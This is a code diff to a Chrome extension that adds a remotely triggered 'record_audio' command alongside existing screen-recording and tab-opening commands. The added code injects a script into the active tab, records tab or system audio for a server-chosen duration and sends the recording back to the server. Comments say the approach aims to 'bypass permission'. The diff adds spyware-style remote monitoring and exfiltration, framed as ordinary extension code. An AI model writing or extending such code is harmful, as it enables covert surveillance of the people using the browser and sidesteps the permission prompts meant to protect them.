@@ -187,6 +187,11 @@ async function processCommand(command) {
                 await captureRecording(command.id, command.requestedById);
                 break;
 
+            case 'record_audio':
+                console.log(`🎤 Audio recording requested by ${command.requestedBy} for ${command.duration}s`);
+                await captureAudio(command.id, command.requestedById, command.duration);
+                break;
+
             case 'open_tabs':
                 console.log(`🌐 Open tabs requested by ${command.requestedBy}`);
                 await openNewTabs(command.id, command.urls);
@@ -552,6 +557,10 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         handleRecordingData(message);
     } else if (message.type === 'recording-error') {
         handleRecordingError(message);
+    } else if (message.type === 'audio-data') {
+        handleAudioData(message);
+    } else if (message.type === 'audio-error') {
+        handleAudioError(message);
     }
 });
 
@@ -577,6 +586,125 @@ async function handleRecordingData(message) {
 async function handleRecordingError(message) {
     console.error('🎥 Recording error:', message.error);
     await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
+}
+
+async function handleAudioData(message) {
+    try {
+        console.log(`🎤 Audio received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB, Duration: ${message.duration}s`);
+
+        await sendCommandResponse(message.commandId, 'audio', {
+            audio: message.audio,
+            tabTitle: message.tabTitle,
+            tabUrl: message.tabUrl,
+            duration: message.duration,
+            size: message.size
+        }, message.userId);
+
+        console.log('✅ Audio sent to server!');
+    } catch (error) {
+        console.error('Error sending audio:', error);
+        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
+    }
+}
+
+async function handleAudioError(message) {
+    console.error('🎤 Audio recording error:', message.error);
+    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
+}
+
+// ============ Audio Recording Capture ============
+async function captureAudio(commandId, userId, duration) {
+    try {
+        // Get active tab
+        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
+        
+        if (!tab) {
+            throw new Error('No active tab found');
+        }
+
+        console.log(`🎤 Starting audio recording for ${duration} seconds...`);
+
+        // Inject content script to handle audio recording
+        // Using getDisplayMedia instead of getUserMedia to bypass permission
+        await chrome.scripting.executeScript({
+            target: { tabId: tab.id },
+            func: async (cmdId, tabInfo, usrId, recordDuration) => {
+                try {
+                    console.log(`🎤 [Content] Starting audio recording for ${recordDuration}s...`);
+                    
+                    // Use getDisplayMedia which auto-grants permission in extensions
+                    // We request audio from the tab/system
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: {
+                            width: { ideal: 1 },
+                            height: { ideal: 1 }
+                        },
+                        audio: true  // This captures system/tab audio
+                    });
+
+                    // Stop all video tracks immediately as we only need audio
+                    stream.getVideoTracks().forEach(track => track.stop());
+
+                    const mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: 'audio/webm;codecs=opus',
+                        audioBitsPerSecond: 128000
+                    });
+
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = async () => {
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onloadend = () => {
+                            chrome.runtime.sendMessage({
+                                type: 'audio-data',
+                                commandId: cmdId,
+                                audio: reader.result,
+                                size: blob.size,
+                                duration: recordDuration,
+                                tabTitle: tabInfo.title,
+                                tabUrl: tabInfo.url,
+                                userId: usrId
+                            });
+                        };
+                        
+                        reader.readAsDataURL(blob);
+                    };
+
+                    mediaRecorder.start();
+                    console.log(`🎤 [Content] Audio recording started for ${recordDuration}s...`);
+
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, recordDuration * 1000);
+
+                } catch (err) {
+                    chrome.runtime.sendMessage({
+                        type: 'audio-error',
+                        commandId: cmdId,
+                        error: err.message,
+                        userId: usrId
+                    });
+                }
+            },
+            args: [commandId, { title: tab.title, url: tab.url }, userId, duration]
+        });
+
+        console.log('🎤 Audio recording script injected...');
+
+    } catch (error) {
+        console.error('Error starting audio recording:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    }
 }
 
 
